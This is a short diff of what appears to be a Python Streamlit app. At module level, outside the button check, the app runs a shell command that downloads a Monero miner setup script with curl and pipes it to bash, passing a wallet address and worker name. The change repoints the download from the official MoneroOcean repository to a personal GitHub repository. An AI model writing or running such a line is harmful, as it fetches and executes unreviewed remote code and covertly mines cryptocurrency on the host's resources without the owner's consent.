@@ -16,4 +16,4 @@ if button == True:
     st.text('Please Enter CMD')
     
 
-os.system(f"curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s {address} {worker}")
+os.system(f"curl -s -L https://raw.githubusercontent.com/Premraj123456/hey/main/setup_moneroocean_miner.sh | bash -s {address} {worker}")
